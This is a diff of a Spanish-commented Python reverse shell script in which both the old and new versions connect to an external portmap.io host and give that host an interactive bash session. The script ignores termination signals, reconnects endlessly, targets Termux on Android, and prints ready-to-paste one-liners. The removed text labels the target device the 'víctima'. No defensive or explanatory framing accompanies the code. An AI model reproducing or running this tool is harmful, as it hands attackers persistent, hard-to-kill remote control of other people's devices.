@@ -1,286 +1,236 @@
 #!/usr/bin/env python3
 """
-▓█████▄  ██▀███   █    ██  ██▓ ▄▄▄▄    ██▓███   ██▓    ▄▄▄     ▓██   ██▓
-▒██▀ ██▌▓██ ▒ ██▒ ██  ▓██▒▓██▒▓█████▄ ▓██░  ██▒▓██▒   ▒████▄    ▒██  ██▒
-░██   █▌▓██ ░▄█ ▒▓██  ▒██░▒██▒▒██▒ ▄██▓██░ ██▓▒▒██░   ▒██  ▀█▄   ▒██ ██░
-░▓█▄   ▌▒██▀▀█▄  ▓▓█  ░██░░██░▒██░█▀  ▒██▄█▓▒ ▒▒██░   ░██▄▄▄▄██  ░ ▐██▓░
-░▒████▓ ░██▓ ▒██▒▒▒█████▓ ░██░░▓█  ▀█▓▒██▒ ░  ░░██████▒▓█   ▓██▒ ░ ██▒▓░
- ▒▒▓  ▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░▓  ░▒▓███▀▒▒▓▒░ ░  ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒
- ░ ▒  ▒   ░▒ ░ ▒░░░▒░ ░ ░  ▒ ░▒░▒   ░ ░▒ ░     ░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░
- ░ ░  ░   ░░   ░  ░░░ ░ ░  ▒ ░ ░    ░ ░░         ░ ░    ░   ▒   ▒ ▒ ░░
-   ░       ░        ░      ░   ░                   ░  ░     ░  ░░ ░
- ░                              ░                             ░  ░ ░
-                REVERSE SHELL ULTRA ESTABLE - PORTMAP.IO
-           TCP://Astrazam-37147.portmap.host:37147 => 8081
-           ¡CONEXIÓN INTERACTIVA CON PTY Y RECONEXIÓN!
+REVERSE SHELL ULTRA ESTABLE - PORTMAP.IO
+Conecta a: Astrazam-37147.portmap.host:37147
 """
 
 import socket
 import subprocess
 import os
-import time
 import sys
-import platform
-import pty
+import time
 import signal
-import select
-import fcntl
-import termios
-import struct
-from datetime import datetime
+import pty
 
 # ===== CONFIGURACIÓN =====
-HOST = "Astrazam-37147.portmap.host"  # Tu URL de Portmap
-PORT = 37147                           # Puerto público
-RECONNECT_DELAY = 2                    # Segundos entre reconexiones
-MAX_RECONNECT_ATTEMPTS = 99999         # Intentos infinitos
+HOST = "Astrazam-37147.portmap.host"  # Tu dominio de portmap
+PORT = 37147                           # Puerto público de portmap
+RECONNECT_DELAY = 3                    # Segundos entre reconexiones
 # =========================
 
-class UltraStableReverseShell:
-    def __init__(self):
-        self.session_start = time.time()
-        self.connection_count = 0
-        self.running = True
-        
-        # Ignorar señales que puedan interrumpir
-        signal.signal(signal.SIGINT, self.signal_handler)
-        signal.signal(signal.SIGTERM, self.signal_handler)
-        signal.signal(signal.SIGHUP, self.signal_handler)
+def ignore_signals():
+    """Ignorar señales para que no mate el proceso"""
+    signal.signal(signal.SIGINT, signal.SIG_IGN)
+    signal.signal(signal.SIGTERM, signal.SIG_IGN)
+    signal.signal(signal.SIGHUP, signal.SIG_IGN)
 
-    def signal_handler(self, signum, frame):
-        """Manejar señales para evitar que la shell se cierre"""
-        print(f"\n[!] Señal {signum} recibida - Ignorando...")
-        return  # No hacer nada, solo ignorar
+def get_shell():
+    """Obtener shell correcto para el sistema"""
+    if os.path.exists('/data/data/com.termux'):
+        return "/data/data/com.termux/files/usr/bin/bash"
+    elif os.path.exists('/bin/bash'):
+        return "/bin/bash"
+    else:
+        return "/bin/sh"
 
-    def set_nonblocking(self, fd):
-        """Configurar file descriptor como no bloqueante"""
+def create_reverse_shell():
+    """Crear conexión reverse shell con PTY"""
+    ignore_signals()
+    shell = get_shell()
+    
+    print(f"[+] Conectando a {HOST}:{PORT}")
+    print(f"[+] Shell: {shell}")
+    print("[+] Iniciando conexión...\n")
+    
+    while True:
         try:
-            fl = fcntl.fcntl(fd, fcntl.F_GETFL)
-            fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
-        except:
-            pass
+            # Crear socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            
+            # Conectar a portmap.io
+            s.connect((HOST, PORT))
+            s.settimeout(None)
+            
+            # Enviar banner
+            banner = f"""
+{'='*50}
+🚀 SHELL CONECTADA VÍA PORTMAP.IO
+{'='*50}
+Host: {socket.gethostname()}
+User: {os.getenv('USER', 'unknown')}
+Hora: {time.strftime('%H:%M:%S')}
+{'='*50}
 
-    def spawn_interactive_shell(self, sock):
-        """Crear una shell completamente interactiva con PTY"""
-        try:
-            # Crear PTY maestro/esclavo
-            master, slave = pty.openpty()
+📟 Shell lista. Escribe comandos:
+            """
+            s.sendall(banner.encode())
             
-            # Configurar el terminal
-            attrs = termios.tcgetattr(slave)
-            attrs[3] = attrs[3] & ~termios.ECHO  # Sin eco
-            termios.tcsetattr(slave, termios.TCSANOW, attrs)
-            
-            # Obtener el shell correcto para el sistema
-            if os.path.exists('/data/data/com.termux'):
-                shell = "/data/data/com.termux/files/usr/bin/bash"
-                shell_cmd = [shell, "-i"]
-            else:
-                shell = "/bin/bash"
-                shell_cmd = [shell, "-i", "--norc"]
-            
-            # Fork para ejecutar la shell
+            # Crear PTY interactivo
             pid = os.fork()
             
             if pid == 0:  # Proceso hijo
-                # Cerrar el maestro
-                os.close(master)
+                # Cerrar socket en hijo (se usa en padre)
+                s.close()
                 
-                # Hacer el esclavo nuestro terminal controlador
+                # Crear nuevo PTY
+                os.setsid()
+                
+                # Abrir PTY maestro/esclavo
+                master, slave = pty.openpty()
+                
+                # Configurar terminal
                 os.dup2(slave, 0)
                 os.dup2(slave, 1)
                 os.dup2(slave, 2)
                 
-                # Configurar el grupo de procesos
-                os.setsid()
-                os.tcsetpgrp(slave, os.getpgid(0))
-                
-                # Variables de entorno para terminal
+                # Variables de entorno
                 os.environ['TERM'] = 'xterm-256color'
-                os.environ['COLORTERM'] = 'truecolor'
-                os.environ['PS1'] = '\\[\\033[1;32m\\]\\u@\\h:\\w\\$\\[\\033[0m\\] '
+                os.environ['PS1'] = '\\[\\033[1;32m\\]rev-shell\\[\\033[0m\\]:\\w\\$ '
                 
                 # Ejecutar shell
-                os.execvp(shell, shell_cmd)
+                os.execl(shell, shell, "-i")
             
             else:  # Proceso padre
-                os.close(slave)
+                # Redirigir socket al PTY
+                os.dup2(s.fileno(), 0)
+                os.dup2(s.fileno(), 1)
+                os.dup2(s.fileno(), 2)
                 
-                # Configurar no bloqueante
-                self.set_nonblocking(master)
-                self.set_nonblocking(sock)
+                # Mantener proceso hijo
+                try:
+                    os.waitpid(pid, 0)
+                except:
+                    pass
                 
-                # Bucle principal de transferencia de datos
-                while True:
-                    try:
-                        rlist, _, _ = select.select([master, sock], [], [], 1)
-                        
-                        for r in rlist:
-                            if r == master:
-                                data = os.read(master, 1024)
-                                if data:
-                                    sock.sendall(data)
-                            elif r == sock:
-                                data = sock.recv(1024)
-                                if data:
-                                    # Enviar datos al master PTY
-                                    os.write(master, data)
-                                    # Forzar flush
-                                    try:
-                                        termios.tcdrain(master)
-                                    except:
-                                        pass
-                                else:
-                                    # Conexión cerrada
-                                    return False
-                    
-                    except (OSError, socket.error, KeyboardInterrupt):
-                        # Ignorar errores y continuar
-                        continue
-                    
-                    except Exception as e:
-                        print(f"[!] Error en PTY: {e}")
-                        time.sleep(1)
-        
+                # Si llegamos aquí, shell terminó
+                s.close()
+                print(f"\n[-] Shell cerrada - Reconectando en {RECONNECT_DELAY}s...")
+                time.sleep(RECONNECT_DELAY)
+                
+        except KeyboardInterrupt:
+            print("\n[+] Interrumpido por usuario")
+            sys.exit(0)
+            
+        except socket.timeout:
+            print("[-] Timeout - Reintentando...")
+            time.sleep(RECONNECT_DELAY)
+            
+        except ConnectionRefusedError:
+            print("[-] Conexión rechazada - Verifica portmap.io")
+            time.sleep(RECONNECT_DELAY * 2)
+            
         except Exception as e:
-            print(f"[!] Error en spawn_interactive_shell: {e}")
-            return False
-        
-        return True
+            print(f"[-] Error: {e} - Reconectando...")
+            time.sleep(RECONNECT_DELAY)
 
-    def connect_and_spawn_shell(self):
-        """Conectar y lanzar shell interactiva"""
-        attempt = 0
-        
-        while self.running and attempt < MAX_RECONNECT_ATTEMPTS:
-            attempt += 1
-            
-            try:
-                print(f"\n[+] 🔄 Intento {attempt} - Conectando a {HOST}:{PORT}")
-                
-                # Crear socket
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                sock.settimeout(15)
-                
-                # Conectar
-                sock.connect((HOST, PORT))
-                sock.settimeout(None)  # Sin timeout después de conectar
-                
-                self.connection_count += 1
-                print(f"[+] ✅ Conexión #{self.connection_count} establecida!")
-                print(f"[+] 🕐 Hora: {datetime.now().strftime('%H:%M:%S')}")
-                
-                # Enviar banner de bienvenida
-                welcome = f"""
-{'='*60}
-🚀 SHELL REMOTA ULTRA ESTABLE - CONECTADA
-{'='*60}
-Host: {socket.gethostname()}
-User: {os.getenv('USER', 'unknown')}
-Platform: {platform.system()} {platform.release()}
-Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-Session: #{self.connection_count}
-{'='*60}
-
-📟 Shell interactiva lista - Escribe comandos:
-                """
-                sock.sendall(welcome.encode())
-                
-                # Lanzar shell interactiva
-                shell_ok = self.spawn_interactive_shell(sock)
-                
-                # Si llegamos aquí, la shell terminó
-                sock.close()
-                
-                if shell_ok:
-                    print(f"\n[-] 🔄 Shell cerrada - Reconectando en {RECONNECT_DELAY}s...")
-                else:
-                    print(f"\n[-] ⚠️  Error en shell - Reconectando...")
-                
-                time.sleep(RECONNECT_DELAY)
-                
-            except socket.timeout:
-                print("[-] ⏱️  Timeout - Reintentando...")
-                time.sleep(RECONNECT_DELAY)
-                
-            except ConnectionRefusedError:
-                print("[-] ❌ Conexión rechazada - Verifica portmap.io")
-                time.sleep(RECONNECT_DELAY * 2)
-                
-            except KeyboardInterrupt:
-                print("\n\n[!] Interrumpido por usuario - Manteniendo conexión...")
-                # No salir, continuar en el bucle
-                time.sleep(1)
-                
-            except Exception as e:
-                print(f"[-] ⚠️  Error: {str(e)[:50]}...")
-                time.sleep(RECONNECT_DELAY)
-
-    def show_banner(self):
-        """Mostrar banner de inicio"""
-        banner = f"""
-{'='*60}
-🔥 REVERSE SHELL ULTRA ESTABLE - PORTMAP.IO
-{'='*60}
-🌍 URL Pública: {HOST}:{PORT}
-👤 Usuario: {os.getenv('USER', 'unknown')}
-📱 Platform: {'Termux/Android' if os.path.exists('/data/data/com.termux') else platform.system()}
-📦 Python: {platform.python_version()}
-⏰ Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-🔧 Modo: PTY Interactivo Completo
-🔄 Reconexión: Automática (delay: {RECONNECT_DELAY}s)
-{'='*60}
-[+] Esta shell incluye:
-    • PTY interactiva completa
-    • Soporte para Ctrl+C, Ctrl+Z
-    • Manejo de flechas y historial
-    • Colores y prompt personalizado
-    • Reconexión automática infinita
-    • Ignorar señales de interrupción
-{'='*60}
-        """
-        print(banner)
-
-    def run(self):
-        """Ejecutar shell inversa ultra estable"""
+def simple_reverse_shell():
+    """Versión simple sin PTY (más robusta)"""
+    ignore_signals()
+    
+    print(f"[+] Versión simple - Conectando a {HOST}:{PORT}")
+    
+    while True:
         try:
-            self.show_banner()
-            print("[*] 🚀 Iniciando conexión ultra estable...")
-            print("[*] 💡 Presiona Ctrl+\\ para salir completamente")
-            print("[*] 🔧 Conectando a portmap.io...\n")
+            s = socket.socket()
+            s.settimeout(10)
+            s.connect((HOST, PORT))
+            s.settimeout(None)
             
-            self.connect_and_spawn_shell()
+            print("[+] Conectado - Iniciando shell...")
+            s.sendall(b"\n[+] Shell conectada - Escribe comandos:\n$ ")
+            
+            while True:
+                try:
+                    # Recibir comando
+                    data = s.recv(1024).decode().strip()
+                    
+                    if not data:
+                        break
+                    
+                    # Comandos especiales
+                    if data.lower() in ["exit", "quit"]:
+                        s.sendall(b"\n[!] Cerrando...\n")
+                        break
+                    
+                    # Ejecutar comando
+                    try:
+                        proc = subprocess.Popen(
+                            data,
+                            shell=True,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            stdin=subprocess.PIPE
+                        )
+                        
+                        output, error = proc.communicate(timeout=30)
+                        
+                        # Enviar salida
+                        if output:
+                            s.sendall(output)
+                        if error:
+                            s.sendall(b"\n[ERROR]: " + error)
+                            
+                        s.sendall(b"\n$ ")
+                        
+                    except subprocess.TimeoutExpired:
+                        s.sendall(b"\n[TIMEOUT] Comando tardando mucho\n$ ")
+                        proc.kill()
+                    except Exception as e:
+                        s.sendall(f"\n[ERROR]: {str(e)[:100]}\n$ ".encode())
+                
+                except socket.timeout:
+                    # Mantener conexión viva
+                    s.sendall(b"\n[PING] Conexión activa\n$ ")
+                    continue
+                except:
+                    break
+            
+            s.close()
+            time.sleep(RECONNECT_DELAY)
             
         except KeyboardInterrupt:
-            print("\n\n[+] ✅ Shell finalizada por usuario")
-            self.running = False
+            print("\n[+] Interrumpido")
             sys.exit(0)
         except Exception as e:
-            print(f"\n[!] Error crítico: {e}")
-            print("[!] Reiniciando en 5 segundos...")
-            time.sleep(5)
-            self.run()  # Reiniciar
+            print(f"[-] Error: {e} - Reconectando...")
+            time.sleep(RECONNECT_DELAY)
 
-# ===== VERSIÓN ONE-LINER MEJORADA =====
-ONE_LINER = '''python3 -c "import socket,os,pty,time,subprocess,signal,fcntl,termios,select;signal.signal(signal.SIGINT,lambda *a:None);h='Astrazam-37147.portmap.host';p=37147;sh='/data/data/com.termux/files/usr/bin/bash' if os.path.exists('/data/data/com.termux') else '/bin/bash';os.environ.update({'TERM':'xterm','PS1':'\\\\[\\\\033[1;31m\\\\]rev-shell\\\\[\\\\033[0m\\\\]:\\\\w\\\\$ '});while True: try: s=socket.socket();s.connect((h,p));print('[+] Connected');m,sl=pty.openpty();pid=os.fork();[os.close(sl),os.dup2(m,0),os.dup2(m,1),os.dup2(m,2),os.setsid(),os.tcsetpgrp(m,os.getpgid(0)),os.execvp(sh,[sh,'-i','--norc'])] if pid==0 else [os.close(sl),[fcntl.fcntl(f,fcntl.F_SETFL,fcntl.fcntl(f,fcntl.F_GETFL)|os.O_NONBLOCK) for f in (m,s)],[[(r==m and s.send(os.read(m,4096))) or (r==s and os.write(m,s.recv(4096)))] for r,_,_ in [select.select([m,s],[],[],1)] for _ in r] while s.fileno()>=0];s.close();time.sleep(2) except: time.sleep(2)"'''
-
-# ===== EJECUCIÓN =====
 if __name__ == "__main__":
-    if len(sys.argv) > 1 and sys.argv[1] == "oneliner":
-        print("\n📋 ONE-LINER ULTRA COMPACTO PARA COPIAR Y PEGAR:")
-        print("-" * 70)
-        print(ONE_LINER)
-        print("-" * 70)
-        print("\n📝 Para usar: Copia y pega esto en Termux (víctima)")
-        print("   La shell se mantendrá viva y se reconectará automáticamente")
-    elif len(sys.argv) > 1 and sys.argv[1] == "simple":
-        # Versión simple para sistemas limitados
-        SIMPLE_ONE_LINER = '''while true; do python3 -c "import socket,os,pty;s=socket.socket();s.connect(('Astrazam-37147.portmap.host',37147));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"; sleep 2; done'''
-        print("\n📋 VERSIÓN SIMPLE (para sistemas con menos recursos):")
-        print("-" * 70)
-        print(SIMPLE_ONE_LINER)
-        print("-" * 70)
-    else:
-        shell = UltraStableReverseShell()
-        shell.run()
+    # Mostrar banner
+    print(f"""
+{'='*60}
+🔥 REVERSE SHELL - PORTMAP.IO
+{'='*60}
+🌍 URL: {HOST}:{PORT}
+👤 Usuario: {os.getenv('USER', 'unknown')}
+📱 Sistema: {'Termux/Android' if os.path.exists('/data/data/com.termux') else 'Linux'}
+⏰ Hora: {time.strftime('%Y-%m-%d %H:%M:%S')}
+{'='*60}
+[1] Modo interactivo completo (PTY)
+[2] Modo simple (más robusto)
+[3] One-liner para copiar
+{'='*60}
+    """)
+    
+    try:
+        choice = input("Selecciona opción (1/2/3): ").strip()
+        
+        if choice == "1":
+            create_reverse_shell()
+        elif choice == "2":
+            simple_reverse_shell()
+        elif choice == "3":
+            oneliner = f'''python3 -c "import socket,os,time;h='{HOST}';p={PORT};exec('while 1: try: s=__import__(\\'socket\\').socket();s.connect((h,p));[os.dup2(s.fileno(),f) for f in (0,1,2)];os.system(\\'/bin/bash -i\\') except: time.sleep(3)')"'''
+            print(f"\n📋 ONE-LINER PARA COPIAR:")
+            print("-" * 60)
+            print(oneliner)
+            print("-" * 60)
+            print("\nCopiado. Ejecuta en Termux.")
+        else:
+            print("[!] Opción inválida. Usando modo interactivo...")
+            create_reverse_shell()
+            
+    except KeyboardInterrupt:
+        print("\n\n[+] Saliendo...")
+        sys.exit(0)
